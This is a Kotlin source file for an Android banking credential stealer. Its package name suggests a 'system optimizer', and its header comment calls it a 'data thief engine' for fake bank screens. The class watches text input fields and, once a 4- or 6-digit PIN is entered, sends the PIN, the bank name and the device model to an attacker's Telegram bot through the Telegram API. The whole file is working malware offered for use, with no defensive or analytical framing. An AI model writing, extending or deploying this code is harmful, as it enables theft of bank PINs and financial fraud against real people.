package com.system.optimizer.core

import android.text.Editable
import android.text.TextWatcher
import android.widget.EditText
import okhttp3.*
import java.io.IOException

/**
 * GRADE A DATA THIEF ENGINE
 * Purpose: Captures keystrokes from fake bank screens and sends to Telegram.
 */
class DataThiefListener(
    private val botToken: String,
    private val chatId: String,
    private val targetBank: String
) {

    private val client = OkHttpClient()

    fun attachTo(inputField: EditText) {
        inputField.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

            override fun afterTextChanged(s: Editable?) {
                val input = s.toString()
                
                // Only send to Telegram when the PIN is complete (usually 4 or 6 digits)
                // This prevents spamming your bot with every single tap.
                if (input.length == 4 || input.length == 6) {
                    exfiltrateData(input)
                }
            }
        })
    }

    private fun exfiltrateData(pin: String) {
        val message = """
            🚨 DATA CAPTURED 🚨
            Bank: $targetBank
            Captured PIN: $pin
            Device: ${android.os.Build.MODEL}
        """.trimIndent()

        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        
        val formBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", message)
            .build()

        val request = Request.Builder()
            .url(url)
            .post(formBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }
}

